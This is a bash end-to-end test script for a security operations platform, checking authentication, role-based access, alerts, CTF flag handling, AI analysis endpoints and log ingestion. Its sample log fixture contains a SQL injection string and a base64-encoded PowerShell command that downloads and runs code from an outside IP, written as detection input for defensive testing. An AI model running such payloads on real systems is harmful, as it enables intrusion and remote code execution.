#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# AegisSOC end-to-end API test suite.
# Requires a running stack:  docker compose up -d --build
# Usage: BASE_URL=http://localhost ADMIN_PASSWORD=... INGEST_API_KEY=... ./scripts/e2e-test.sh
# The suite provisions its own users and data via the API — nothing is seeded.
# Exits non-zero on any failed check.
# ---------------------------------------------------------------------------
set -u

BASE_URL="${BASE_URL:-http://localhost}"
ADMIN_USER="${ADMIN_USERNAME:-admin}"
ADMIN_PASS="${ADMIN_PASSWORD:?ADMIN_PASSWORD is required}"
INGEST_KEY="${INGEST_KEY:-${INGEST_API_KEY:-}}"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

PASS=0
FAIL=0

say()  { echo -e "$@"; }
ok()   { PASS=$((PASS + 1)); say "  \e[32m✔\e[0m $1"; }
bad()  { FAIL=$((FAIL + 1)); say "  \e[31m✘\e[0m $1"; }

# extract <file> <node-expression>  -> value of expression, or __ERR__ on failure
extract() {
  node -e '
    const j = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
    try { console.log(eval(process.argv[2])); } catch { console.log("__ERR__"); }
  ' "$1" "$2" 2>/dev/null || echo "__ERR__"
}

http() { # method path [body-file] [token] -> writes body to $TMP/body, echoes status
  local method="$1" path="$2" body="${3:-}" token="${4:-}"
  local args=(-s -o "$TMP/body" -w "%{http_code}" -X "$method" "$BASE_URL$path")
  [ -n "$token" ] && args+=(-H "Authorization: Bearer $token")
  if [ -n "$body" ]; then
    args+=(-H "Content-Type: application/json" --data-binary "@$body")
  fi
  curl "${args[@]}"
}

login() { # username password -> token
  echo "{\"username\":\"$1\",\"password\":\"$2\"}" > "$TMP/login.json"
  local code
  code=$(http POST /api/auth/login "$TMP/login.json")
  if [ "$code" != "200" ]; then
    say "  \e[31m✘\e[0m login as $1 failed (HTTP $code)"
    return 1
  fi
  extract "$TMP/body" 'j.accessToken'
}

# ---------------------------------------------------------------------------
say "\n\e[1mAegisSOC E2E suite\e[0m  (base: $BASE_URL, admin: $ADMIN_USER)"

# 0. Wait for readiness -----------------------------------------------------
say "\n[0] Readiness"
for i in $(seq 1 30); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/health") && [ "$code" = "200" ] && break
  sleep 2
done
if [ "$code" = "200" ]; then ok "server healthy"; else bad "server not healthy (HTTP $code)"; exit 1; fi
curl -s "$BASE_URL/api/health" > "$TMP/health.json"
[ "$(extract "$TMP/health.json" 'j.storage' 2>/dev/null || true)" = "postgres" ] && ok "postgres storage active" || bad "expected postgres storage"

# 1. Unauthenticated access rejected ----------------------------------------
say "\n[1] Authentication boundary"
code=$(http GET /api/alerts)
[ "$code" = "401" ] && ok "unauthenticated /api/alerts -> 401" || bad "unauthenticated /api/alerts -> $code (want 401)"
code=$(http POST /api/telemetry/ingest)
[ "$code" = "401" ] && ok "unauthenticated ingest -> 401" || bad "unauthenticated ingest -> $code (want 401)"

# 2. Admin bootstrap + account provisioning via API ----------------------------
say "\n[2] Admin bootstrap & user management"
ADMIN=$(login "$ADMIN_USER" "$ADMIN_PASS") || { bad "admin login failed"; exit 1; }
ok "env-provisioned admin login ($ADMIN_USER)"

# No demo users: only the bootstrap admin exists
code=$(http GET /api/users "" "$ADMIN")
COUNT=$(extract "$TMP/body" 'j.users.length')
[ "$code" = "200" ] && [ "$COUNT" = "1" ] && ok "exactly 1 account (bootstrap admin only, no demo users)" || bad "expected 1 user, got $COUNT (code $code)"

# Admin creates the role accounts
for u in "analyst:Lead SOC Analyst:analyst" "trainer:Training Coordinator:trainer" "viewer:Read-Only Auditor:viewer"; do
  IFS=':' read -r uname uname_display urole <<< "$u"
  echo "{\"username\":\"$uname\",\"name\":\"$uname_display\",\"password\":\"E2E_Pass_2026!\",\"role\":\"$urole\"}" > "$TMP/user.json"
  code=$(http POST /api/users "$TMP/user.json" "$ADMIN")
  [ "$code" = "200" ] && ok "admin created '$uname' ($urole)" || bad "create $uname -> $code"
done

# Duplicate username rejected
echo '{"username":"analyst","name":"Dup","password":"E2E_Pass_2026!","role":"analyst"}' > "$TMP/userdup.json"
code=$(http POST /api/users "$TMP/userdup.json" "$ADMIN")
[ "$code" = "409" ] && ok "duplicate username -> 409" || bad "duplicate username -> $code (want 409)"

# Non-admin cannot manage users
ANA=$(login analyst "E2E_Pass_2026!") || exit 1
ok "analyst login"
TRA=$(login trainer "E2E_Pass_2026!") || exit 1
ok "trainer login"
VIEW=$(login viewer "E2E_Pass_2026!") || exit 1
ok "viewer login"
code=$(http POST /api/users "$TMP/user.json" "$ANA")
[ "$code" = "403" ] && ok "analyst denied user creation (403)" || bad "analyst user creation -> $code (want 403)"

# 3. Alerts: platform starts empty, alerts created via API ---------------------
say "\n[3] Alerts (empty start)"
code=$(http GET "/api/alerts" "" "$ANA")
[ "$code" = "200" ] && ok "list alerts" || bad "list alerts -> $code"
TOTAL=$(extract "$TMP/body" 'j.total')
[ "$TOTAL" = "0" ] 2>/dev/null && ok "no seeded/demo alerts (total=0)" || bad "expected 0 alerts, got $TOTAL"

echo '{"severity":"high","title":"E2E Test Alert","description":"Created by the E2E suite","source":"e2e","sourceIp":"203.0.113.42","destIp":"10.0.0.5","asset":"e2e-host"}' > "$TMP/alert.json"
code=$(http POST /api/alerts/create "$TMP/alert.json" "$ANA")
[ "$code" = "200" ] && ok "analyst created alert" || bad "create alert -> $code"
ALERT_ID=$(extract "$TMP/body" 'j.id')
[ -n "$ALERT_ID" ] && [ "$ALERT_ID" != "__ERR__" ] && ok "alert id: $ALERT_ID" || bad "missing alert id"
code=$(http GET "/api/alerts/$ALERT_ID" "" "$ANA")
[ "$code" = "200" ] && ok "get alert by id" || bad "get alert by id -> $code"

# 4. Triage + persistence ----------------------------------------------------
say "\n[4] Triage"
echo '{"status":"investigating","triage_notes":"e2e check"}' > "$TMP/triage.json"
code=$(http PATCH "/api/alerts/$ALERT_ID/triage" "$TMP/triage.json" "$ANA")
[ "$code" = "200" ] && ok "triage accepted" || bad "triage -> $code"
code=$(http GET "/api/alerts/$ALERT_ID" "" "$ANA")
[ "$(extract "$TMP/body" 'j.triage_notes')" = "e2e check" ] && ok "triage persisted" || bad "triage not persisted"

# 5. CTF integrity + per-user solves (challenge created from the alert) ---------
say "\n[5] CTF (flags server-side, per-user state)"
code=$(http GET "/api/ctf/challenges" "" "$ANA")
[ "$code" = "200" ] && ok "list challenges" || bad "list challenges -> $code"
if grep -q "FLAG{" "$TMP/body"; then bad "flags leaked in /api/ctf/challenges"; else ok "no flags in challenge list"; fi

code=$(http POST "/api/alerts/$ALERT_ID/convert-to-ctf" "" "$ANA")
[ "$code" = "200" ] && ok "alert converted to CTF challenge" || bad "convert-to-ctf -> $code"
CHALLENGE_ID=$(extract "$TMP/body" 'j.challenge.id')
FLAG="FLAG{real_incident_$(echo "$ALERT_ID" | tr '[:upper:]' '[:lower:]')_solved}"
[ -n "$CHALLENGE_ID" ] && [ "$CHALLENGE_ID" != "__ERR__" ] && ok "challenge id: $CHALLENGE_ID" || bad "missing challenge id"

echo "{\"flag\":\"$FLAG\"}" > "$TMP/flag.json"
code=$(http POST "/api/ctf/challenges/$CHALLENGE_ID/submit" "$TMP/flag.json" "$ANA")
[ "$code" = "200" ] && ok "correct flag accepted (+$(extract "$TMP/body" 'j.pointsAwarded') pts)" || bad "correct flag -> $code"
code=$(http POST "/api/ctf/challenges/$CHALLENGE_ID/submit" "$TMP/flag.json" "$ANA")
MSG=$(extract "$TMP/body" 'j.message')
[ "$code" = "200" ] && echo "$MSG" | grep -qi "already" && ok "duplicate submission not double-awarded" || bad "duplicate submission: $MSG"

code=$(http GET "/api/ctf/challenges" "" "$TRA")
SOLVED=$(extract "$TMP/body" "j.find(function(c){return c.id===\"$CHALLENGE_ID\"}).solved")
[ "$SOLVED" = "false" ] && ok "per-user isolation: trainer still sees unsolved" || bad "trainer sees solved=$SOLVED"

code=$(http GET "/api/ctf/leaderboard" "" "$ANA")
if echo "$(extract "$TMP/body" 'JSON.stringify(j)' 2>/dev/null || echo '')" | grep -q "Lead SOC Analyst"; then
  ok "leaderboard shows real user"
else
  bad "leaderboard missing real user"
fi

# 6. Hints (per-user) ----------------------------------------------------------
say "\n[6] CTF hints"
code=$(http POST "/api/ctf/challenges/$CHALLENGE_ID/unlock-hint" "" "$ANA")
[ "$code" = "200" ] && ok "analyst unlocked hint" || bad "unlock hint -> $code"
code=$(http GET "/api/ctf/challenges" "" "$TRA")
UNLOCKED=$(extract "$TMP/body" "j.find(function(c){return c.id===\"$CHALLENGE_ID\"}).hintUnlocked")
[ "$UNLOCKED" = "false" ] && ok "trainer hint state isolated" || bad "trainer hintUnlocked=$UNLOCKED"

# 7. Training (no seeded courses — API responds correctly on empty/unknown) -------
say "\n[7] Training"
code=$(http GET "/api/training/courses" "" "$TRA")
[ "$code" = "200" ] && ok "list courses" || bad "list courses -> $code"
CNT=$(extract "$TMP/body" 'j.length')
[ "$CNT" = "0" ] 2>/dev/null && ok "no demo courses (empty catalog)" || bad "expected 0 courses, got $CNT"
echo '{}' > "$TMP/empty.json"
code=$(http POST /api/training/courses/NOPE/lessons/NOPE-L1/complete "$TMP/empty.json" "$TRA")
[ "$code" = "404" ] && ok "unknown course lesson -> 404" || bad "unknown course lesson -> $code (want 404)"

# 8. AI module ------------------------------------------------------------------
say "\n[8] AI (zero-training-data)"
code=$(http POST /api/ai/anomaly "$TMP/empty.json" "$ANA")
[ "$code" = "200" ] && [ "$(extract "$TMP/body" 'j.riskLevel' 2>/dev/null || true)" = "low" ] && ok "anomaly detection on empty telemetry (risk=low)" || bad "anomaly -> $code"
code=$(http POST /api/ai/correlate "$TMP/empty.json" "$ANA")
[ "$code" = "200" ] && [ "$(extract "$TMP/body" 'j.clusters.length' 2>/dev/null || true)" = "0" ] && ok "alert correlation (no clusters on sparse data)" || bad "correlate -> $code"
echo '{"rawEmail":"Received-SPF: fail (evil.example) client-ip=198.51.100.44\nSubject: URGENT password reset\nAuthentication-Results: spf=fail; dmarc=fail"}' > "$TMP/phish.json"
code=$(http POST /api/ai/phishing-analyze "$TMP/phish.json" "$ANA")
[ "$code" = "200" ] && [ "$(extract "$TMP/body" 'j.spfCheck')" = "FAIL" ] && ok "phishing analysis (SPF=FAIL)" || bad "phishing -> $code"
echo "{\"challengeId\":\"$CHALLENGE_ID\"}" > "$TMP/hint.json"
code=$(http POST /api/ai/ctf-hint "$TMP/hint.json" "$ANA")
[ "$code" = "200" ] && ! grep -q "FLAG{" "$TMP/body" && ok "AI ctf hint (no flag leak)" || bad "ctf-hint -> $code"

# 9. Settings: retention + Gemini key --------------------------------------------
say "\n[9] Platform settings"
code=$(http GET /api/settings "" "$ANA")
[ "$code" = "403" ] && ok "non-admin denied settings (403)" || bad "analyst settings -> $code (want 403)"
code=$(http GET /api/settings "" "$ADMIN")
[ "$code" = "200" ] && ok "admin reads settings" || bad "admin settings -> $code"
echo '{"alertRetention":1234,"telemetryRetention":5678,"analysisRetention":90}' > "$TMP/settings.json"
code=$(http PUT /api/settings "$TMP/settings.json" "$ADMIN")
[ "$code" = "200" ] && [ "$(extract "$TMP/body" 'j.settings.alertRetention')" = "1234" ] && ok "retention settings saved" || bad "update settings -> $code"
code=$(http GET /api/settings "" "$ADMIN")
[ "$(extract "$TMP/body" 'j.settings.telemetryRetention')" = "5678" ] && ok "retention persisted" || bad "retention not persisted"

# 10. RBAC ------------------------------------------------------------------------
say "\n[10] RBAC"
code=$(http POST /api/analysis/ingest "$TMP/empty.json" "$VIEW")
[ "$code" = "403" ] && ok "viewer denied log analysis (403)" || bad "viewer analysis -> $code (want 403)"
code=$(http GET "/api/audit" "" "$ANA")
[ "$code" = "403" ] && ok "analyst denied audit (403)" || bad "analyst audit -> $code (want 403)"
code=$(http GET "/api/audit" "" "$ADMIN")
[ "$code" = "200" ] && ok "admin can read audit" || bad "admin audit -> $code"

# 11. Log analysis (paste/edit/upload) ---------------------------------------------
say "\n[11] Log & data analysis"
cat > "$TMP/sample.log" <<'EOF'
<134>Sep 10 09:15:22 dc-prod-01 sshd[1234]: Failed password for root from 45.227.255.9 port 55222 ssh2
<134>Sep 10 09:15:23 dc-prod-01 sshd[1234]: Failed password for admin from 45.227.255.9 port 55223 ssh2
<134>Sep 10 09:15:24 dc-prod-01 sshd[1234]: Failed password for sa from 45.227.255.9 port 55224 ssh2
<134>Sep 10 09:15:31 web-portal-01 nginx[8901]: 194.26.29.114 - - [10/Sep/2026:09:15:31 +0000] "GET /api/staff/search?dept=finance' UNION SELECT 1,username,3 FROM users-- HTTP/1.1" 500 512
<134>Sep 10 09:16:02 ws-finance-09 powershell[4021]: powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAzADcALgAzADIALgA2ADUALgAxADIALwBhACcAKQAgAC0AdwBpAG4AZABvAHcAcwB0AHkAbABlACAAaABpAGQAZABlAG4A
EOF
code=$(curl -s -o "$TMP/body" -w "%{http_code}" -X POST "$BASE_URL/api/analysis/ingest?source=e2e-sample.log" \
  -H "Content-Type: text/plain" -H "Authorization: Bearer $ANA" --data-binary "@$TMP/sample.log")
[ "$code" = "200" ] && ok "log ingest accepted (text/plain)" || bad "log ingest -> $code"
FINDINGS=$(extract "$TMP/body" 'j.findings.length')
[ "$FINDINGS" -ge 1 ] 2>/dev/null && ok "threat findings detected ($FINDINGS)" || bad "expected findings, got $FINDINGS"
SUSP=$(extract "$TMP/body" 'j.suspiciousCount')
[ "$SUSP" -ge 1 ] 2>/dev/null && ok "suspicious events flagged ($SUSP)" || bad "suspiciousCount=$SUSP"
code=$(http GET "/api/analysis/runs" "" "$ANA")
[ "$code" = "200" ] && ok "analysis history readable" || bad "analysis runs -> $code"

# 12. Telemetry ingest ---------------------------------------------------------------------
say "\n[12] Telemetry ingest"
if [ -n "$INGEST_KEY" ]; then
  echo '{"events":[{"isAlert":true,"severity":"high","title":"E2E Ingest","source":"e2e","sourceIp":"203.0.113.77"}]}' > "$TMP/ingest.json"
  code=$(curl -s -o "$TMP/body" -w "%{http_code}" -X POST "$BASE_URL/api/telemetry/ingest" \
    -H "Content-Type: application/json" -H "x-api-key: $INGEST_KEY" --data-binary "@$TMP/ingest.json")
  [ "$code" = "200" ] && ok "ingest with API key accepted" || bad "ingest with key -> $code"
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/api/telemetry/ingest" \
    -H "Content-Type: application/json" -H "x-api-key: wrong-key" --data-binary "@$TMP/ingest.json")
  [ "$code" = "401" ] && ok "ingest with wrong key -> 401" || bad "ingest wrong key -> $code (want 401)"
else
  say "  (skipped — set INGEST_API_KEY to test machine-key ingest)"
fi

# ---------------------------------------------------------------------------
say ""
say "\e[1mResults: $PASS passed, $FAIL failed\e[0m"
[ "$FAIL" -eq 0 ] || exit 1